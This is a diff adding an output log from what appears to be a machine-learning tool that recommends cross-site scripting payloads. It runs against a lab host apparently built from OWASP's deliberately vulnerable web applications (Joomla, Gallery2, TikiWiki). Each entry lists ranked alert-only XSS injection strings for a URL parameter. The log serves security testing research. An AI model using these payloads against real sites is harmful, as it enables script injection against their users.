@@ -1,0 +1,141 @@
+[+] Target url: http://192.168.25.208/joomla/index.php?option=com_user&view=login&Itemid=2
+Parameter: view
+[*] Feature: [10, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0]
+[+] Start prediction...
+[*] Loading trained data: /root/machine_learning_security/Recommender/trained_data/recommender.h5
+Recommended.
+Rank	Injection code	Probability
+================================================================================
+[*] 1	 onmousemove=alert``; 	0.529457151889801
+[*] 2	</textarea><img src=x onerror=alert``;>	0.44944772124290466
+[*] 3	javascript:alert``;	0.0177263543009758
+[+] Finish prediction...
+[*] Elapsed time :6.40760612487793[sec]
+
+
+
+[+] Target url: http://192.168.25.208/joomla/index.php?view=article&id=2:xcloner-21&format=pdf
+Parameter: view
+[*] Feature: [10, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0]
+[+] Start prediction...
+[*] Loading trained data: /root/machine_learning_security/Recommender/trained_data/recommender.h5
+Recommended.
+Rank	Injection code	Probability
+================================================================================
+[*] 1	 onmousemove=alert``; 	0.529457151889801
+[*] 2	</textarea><img src=x onerror=alert``;>	0.44944772124290466
+[*] 3	javascript:alert``;	0.0177263543009758
+[+] Finish prediction...
+[*] Elapsed time :1.3079040050506592[sec]
+
+
+[+] Target url: http://192.168.25.208/joomla/index.php?view=article&id=2:xcloner-21&tmpl=component&print=1&layout=default&page=
+Parameter: layout
+[*] Feature: [10, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0]
+[+] Start prediction...
+[*] Loading trained data: /root/machine_learning_security/Recommender/trained_data/recommender.h5
+Recommended.
+Rank	Injection code	Probability
+================================================================================
+[*] 1	 onmousemove=alert``; 	0.529457151889801
+[*] 2	</textarea><img src=x onerror=alert``;>	0.44944772124290466
+[*] 3	javascript:alert``;	0.0177263543009758
+[+] Finish prediction...
+[*] Elapsed time :2.749551296234131[sec]
+
+
+
+
+[+] Target url: http://192.168.25.208/gallery2/main.php?g2_view=core.UserAdmin&g2_subView=core.UserLogin&g2_return=main.php%3F&&g2_returnName=album
+Parameter: g2_return
+[*] Feature: [5, 3, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0]
+[+] Start prediction...
+2020-04-24 22:14:37.292392: I tensorflow/core/platform/cpu_feature_guard.cc:141] Your CPU supports instructions that this TensorFlow binary was not compiled to use: AVX2 FMA
+[*] Loading trained data: /root/machine_learning_security/Recommender/trained_data/recommender.h5
+Recommended.
+Rank	Injection code	Probability
+================================================================================
+[*] 1	 onmousemove=alert(); 	0.5790939331054688
+[*] 2	javascript:alert();	0.4060744643211365
+[*] 3	 onerror=alert();	0.012354674749076366
+[+] Finish prediction...
+[*] Elapsed time :1.031360387802124[sec]
+
+
+
+
+[+] Target url: http://192.168.25.208/joomla/index.php?option=com_mailto&tmpl=component&link=aHR0cDovLzE5Mi4xNjguMjUuMjA4L2pvb21sYS9pbmRleC5waHA/b3B0aW9uPWNvbV9jb250ZW50JnZpZXc9YXJ0aWNsZSZpZD0xOndlbGNvbWU=
+Parameter: link
+[*] Feature: [5, 3, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0]
+[+] Start prediction...
+[*] Loading trained data: /root/machine_learning_security/Recommender/trained_data/recommender.h5
+Recommended.
+Rank	Injection code	Probability
+================================================================================
+[*] 1	 onmousemove=alert``; 	0.9966133236885071
+[*] 2	 onerror=alert``;	0.0033034724183380604
+[*] 3	" onmousemove=alert``;"	7.085807010298595e-05
+[+] Finish prediction...
+[*] Elapsed time :2.042551040649414[sec]
+
+
+
+
+[+] Target url: http://192.168.25.208/tikiwiki/tiki-featured_link.php?type=f&url=https%3A%2F%2Fwww.owasp.org%2Findex.php%2FOWASP_Broken_Web_Applications_Project
+Parameter: url
+[*] Feature: [8, 2, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0]
+[+] Start prediction...
+[*] Loading trained data: /root/machine_learning_security/Recommender/trained_data/recommender.h5
+Recommended.
+Rank	Injection code	Probability
+================================================================================
+[*] 1	</textarea><img src=x onerror=alert();>	0.9992095232009888
+[*] 2	javascript:alert();	0.00040538320899941027
+[*] 3	"></iframe><script>alert();</script>	0.0001939755748026073
+[+] Finish prediction...
+[*] Elapsed time :4.18777322769165[sec]
+
+
+
+[+] Target url: http://192.168.25.208/joomla/index.php?view=article&id=1:welcome&format=pdf
+Parameter: view
+[*] Feature: [10, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0]
+[+] Start prediction...
+[*] Loading trained data: /root/machine_learning_security/Recommender/trained_data/recommender.h5
+Recommended.
+Rank	Injection code	Probability
+================================================================================
+[*] 1	 onmousemove=alert``; 	0.529457151889801
+[*] 2	</textarea><img src=x onerror=alert``;>	0.44944772124290466
+[*] 3	javascript:alert``;	0.0177263543009758
+[+] Finish prediction...
+[*] Elapsed time :7.968876838684082[sec]
+
+
+[+] Target url: http://192.168.25.208/joomla/index.php?view=article&id=1:welcome&tmpl=component&print=1&layout=default&page=
+Parameter: view
+[*] Feature: [10, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0]
+[+] Start prediction...
+[*] Loading trained data: /root/machine_learning_security/Recommender/trained_data/recommender.h5
+Recommended.
+Rank	Injection code	Probability
+================================================================================
+[*] 1	 onmousemove=alert``; 	0.529457151889801
+[*] 2	</textarea><img src=x onerror=alert``;>	0.44944772124290466
+[*] 3	javascript:alert``;	0.0177263543009758
+[+] Finish prediction...
+[*] Elapsed time :4.559208393096924[sec]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
